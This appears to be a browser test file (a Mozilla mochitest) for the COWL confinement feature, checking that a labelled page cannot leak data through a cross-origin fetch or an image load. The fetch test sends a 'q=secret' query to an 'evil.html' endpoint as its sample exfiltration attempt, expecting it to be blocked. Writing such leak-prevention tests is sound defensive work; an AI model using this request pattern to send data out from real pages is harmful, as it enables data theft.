<script>
  COWL.enable();
  COWL.confidentiality = new Label('http://alice.com/');

  var wParent = SpecialPowers.wrap(parent);
  var wwParent = SpecialPowers.Cu.waiveXrays(wParent);

  function testFetch() {
    // try sending a fetch req to somewhere....
    fetch('http://example.com/tests/dom/tests/mochitest/cowl/evil.html?q=secret').then(function(res) {
      wwParent.ok_wrapper(false, 'Should not be able to communicate with arbitrary origins');
      }).catch(function(err) {
      wwParent.ok_wrapper(true, 'Should not be able to communicate with arbitrary origins');
    });
  }

  function testConstructImage() {
    var img = document.createElement('img');
    img.src = 'http://example.com/tests/dom/tests/mochitest/cowl/jupiter.jpg';

    img.onload = function() {
      wwParent.ok_wrapper(false, 'Should not load image after reading sensitive information');
    };
    img.onerror = function() {
      wwParent.ok_wrapper(true, 'Should not load image after reading sensitive information');
    };
  }

  testFetch();
  testConstructImage();

</script>
